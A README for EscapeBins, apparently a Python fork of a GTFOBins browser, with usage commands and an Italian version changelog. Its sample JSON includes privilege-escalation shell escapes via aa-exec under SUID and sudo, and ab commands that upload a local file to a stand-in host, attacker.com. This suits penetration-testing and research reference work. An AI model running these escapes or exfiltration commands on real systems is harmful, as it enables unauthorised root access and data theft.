EscapeBins is a command-line tool designed for interacting with and displaying entries from GTFOBins, a project that documents Unix binaries that can be used to bypass local security restrictions. Below is an introduction and breakdown of the script:

### Overview

The script provides functionality for searching, displaying, and generating reports on GTFOBins entries. It uses a JSON data file (`binaries.json`) that contains information on various binaries, including their descriptions and associated functions that can be exploited for security purposes. Users can list available binaries, generate reports, or query specific binaries through command-line arguments.

The JSON file must have a structure similar to the following:

```json
{
    "aa-exec": {
		"functions": {
			"shell": [
				{
					"code": "aa-exec /bin/sh"
				}
			],
			"suid": [
				{
					"code": "./aa-exec /bin/sh -p"
				}
			],
			"sudo": [
				{
					"code": "sudo aa-exec /bin/sh"
				}
			]
		}
	},
	"ab": {
		"functions": {
			"file-upload": [
				{
					"description": "Upload local file via HTTP POST request.",
					"code": "URL=http://attacker.com/\nLFILE=file_to_send\nab -p $LFILE $URL"
				}
			],
			"file-download": [
				{
					"description": "Fetch a remote file via HTTP GET request. The response is returned as part of the verbose output of the program with some limitations on the length.",
					"code": "URL=http://attacker.com/file_to_download\nab -v2 $URL"
				}
			],
			"suid": [
				{
					"description": "Upload local file via HTTP POST request.",
					"code": "URL=http://attacker.com/\nLFILE=file_to_send\n./ab -p $LFILE $URL"
				}
			],
			"sudo": [
				{
					"description": "Upload local file via HTTP POST request.",
					"code": "URL=http://attacker.com/\nLFILE=file_to_send\nsudo ab -p $LFILE $URL"
				}
			]
		}
	}
}
```

### Requirements

To run this tool, you'll need Python 3 and the following Python packages:

```bash
pip install colorama    # For colored terminal output
pip install pygments   # For syntax highlighting
pip install jinja2     # For report template rendering
```

### Example Usage

- To list all available binaries:

```shell
python3 gtfo.py -l
```
- To generate a report for specific binaries:
  
```shell
python3 gtfo.py -r binary1 binary2 --output report.md
```
- To query a specific binary:
  
```shell
python3 gtfo.py binary_name
```

This script is ideal for security researchers, system administrators, and penetration testers looking to easily explore GTFOBins entries and generate detailed reports for analysis or documentation purposes.


---

## Changelog
### v1.0.0

Fork iniziale di t0thkr1s.

### v1.1.1

Restyling grafico dello script e formattazione migliorata. 

### v1.1.3

Aggiunti i seguenti binari: apt, 7z.

### v1.1.4

Correzioni minori alla formattazione. 

### v1.2.0

Aggiunti i seguenti binari: aa-exec, ab, agetty, alpine, ansible-playbook, ansible-test.

### v1.2.5

Aggiunti i seguenti binari: aoss, apache2ctl, apt-get, ar, aria2c.

### v1.2.6

Modificato il colore delle sezioni dei binari in fase di stampa.

### v1.3.0

Aggiunti i seguenti binari: arj, arp, as, ascii-xfr.

### v1.3.9

Aggiunti i seguenti binari: ascii85, ash, aspell, at, atobm, awk, aws, base32, base58.

### v1.4.0

Modificata la funzione `list_available_binaries` per calcolare il numero di binari disponibili. 

### v1.5.0

Aggiunti i seguenti binari: base64, basenc, basez, bash, batcat, bc, bconsole, bpftrace, bridge, bundle.

### v1.6.0

Aggiunti i seguenti binari: bundler, busctl, busybox, byebug, bzip2, c89, c99, cabal, cancel, capsh

### v2.6.0

Aggiunta una nuova funzionalità che permette di generare un report dettagliato con le info dei binari.

### v2.7.0

Aggiunti i seguenti binari: cat, cdist, certbot, check_by_ssh, check_cups, check_log, check_memory, check_raid, check_ssl_cert, check_statusfile

### v2.8.0

Aggiunti i seguenti binari: chmod, choom, chown, chroot, clamscan, cmp, cobc, column, comm, composer

### v2.8.1

Migliorata la funzione `list_available_binaries` per stampare i binari disponibili sotto forma di tabella. 

### v2.9.0

Aggiunti i seguenti binari: cowsay, cowthink, cp, cpan, cpio, cpulimit, crash, crontab, csh, csplit

### v3.0.0

Aggiunti i seguenti binari: csvtool, cupsfilter, curl, cut, dash, date, dc, dd, debugfs, dialog

### v3.1.0

Aggiunti i seguenti binari: diff, dig, distcc, dmesg, dmidecode, dmsetup, dnf, docker, dos2unix, dosbox

### v3.2.0

Aggiunti i seguenti binari: dotnet, dpkg, dstat, dvips, easy_install, eb, ed, efax, elvish

### v3.3.0

Aggiunti i seguenti binari: emacs, enscript, env, eqn, espeak, ex, exiftool, expand, expect, facter

### v3.4.0

Aggiunti i seguenti binari: file, find, finger, fish, flock, fmt, fold, fping, ftp, gawk, gcc

### v3.5.0

Aggiunti i seguenti binari: gcloud, gcore, gdb, gem, genie, genisoimage, ghc, ghci, gimp, ginsh

### v3.6.0

Aggiunti i seguenti binari: git, grc, grep, gtester, gzip, hd, head, hexdump, highlight, hping3

### v3.7.0

Aggiunti i seguenti binari: iconv, iftop, install, ionice, ip, irb, ispell, joe, join, journalctl

### v3.8.0

Aggiunti i seguenti binari: jq, jtag, julia, knife, ksh, ksshell, ksu, kubectl, latex, latexmk

### v3.9.0

Aggiunti i seguenti binari: ld.so, ldconfig, less, lftp, links, ln, loginctl, logsave, look, lp

### v4.0.0

Aggiunti i seguenti binari: ltrace, lua, lualatex, luatex, lwp-download, lwp-request, mail, make, man, mawk

### v4.1.0

Aggiunti i seguenti binari: minicom, more, mosquitto, mount, msfconsole, msgattrib, msgcat, msgconv, msgfilter, msgmerge

### v4.2.0

Aggiunti i seguenti binari: msguniq, mtr, multitime, mv, mysql, nano, nasm, nawk, nc, ncdu

### v4.3.0

Aggiunti i seguenti binari: ncftp, neofetch, nft, nice, nl, nm, nmap, node, nohup, npm

### v4.4.0

Aggiunti i seguenti binari: nroff, nsenter, ntpdate, octave, od, openssl, openvpn, openvt, opkg, pandoc 

### v4.5.0

Aggiunti i seguenti binari: paste, pax, pdb, pdflatex, pdftex, perf, perl, perlbug, pexec, pg

### v4.5.1

Migliorata la funzione `list_available_binaries` per poter listare per una specifica lettera.

### v4.6.0

Aggiunti i seguenti binari: php, pic, pico, pidstat, pip, pkexec, pkg, posh, pr, pry

### v4.7.0

Aggiunti i seguenti binari: psftp, psql, ptx, puppet, pwsh, python, rake, rc, readelf, red

### v4.8.0

Aggiunti i seguenti binari: redcarpet, redis, restic, rev, rlogin, rlwrap, rpm, rpmdb, rpmquery, rpmverify

### v4.9.0

Aggiunti i seguenti binari: rsync, rtorrent, ruby, run-mailcap, run-parts, runscript, rview, rvim, sash, scanmem

### v5.0.0

Aggiunti i seguenti binari: scp, screen, script, scrot, sed, service, setarch, setfacl, setlock, sftp

### v5.1.0

Aggiunti i seguenti binari: sg, shuf, slsh, smbclient, snap, socat, socket, soelim, softlimit, sort

### v5.2.0

Aggiunti i seguenti binari: split, sqlite3, sqlmap, ss, ssh-agent, ssh-keygen, ssh-keyscan, ssh, sshpass, start-stop-daemon

### v5.3.0

Aggiunti i seguenti binari: stdbuf, strace, strings, su, sudo, sysctl, systemctl, systemd-resolve, tac, tail

### v5.4.0

Aggiunti i seguenti binari: tar, task, taskset, tasksh, tbl, tclsh, tcpdump, tdbtool, tee, telnet

### v5.5.0

Aggiunti i seguenti binari: terraform, tex, tftp, tic, time, timedatectl, timeout, tmate, tmux, top

### v5.6.0

Aggiunti i seguenti binari: torify, torsocks, troff, tshark, ul, unexpand, uniq, unshare, unsquashfs, unzip

### v5.7.0

Aggiunti i seguenti binari: update-alternatives, uudecode, uuencode, vagrant, valgrind, varnishncsa, vi, view, vigr, vimdiff

### v5.8.0

Aggiunti i seguenti binari: vipw, virsh, volatility, w3m, wall, watch, wc, wget, whiptail, whois

### v5.9.0

Aggiunti i seguenti binari: wireshark, wish, xargs, xdg-user-dir, xdotool, xelatex, xetex, xmodmap, xmore, xpad

### v6.0.0

Aggiunti i seguenti binari: xxd, xz, yarn, yash, yelp, yum, zathura, zip, zsh, zsoelim, zypper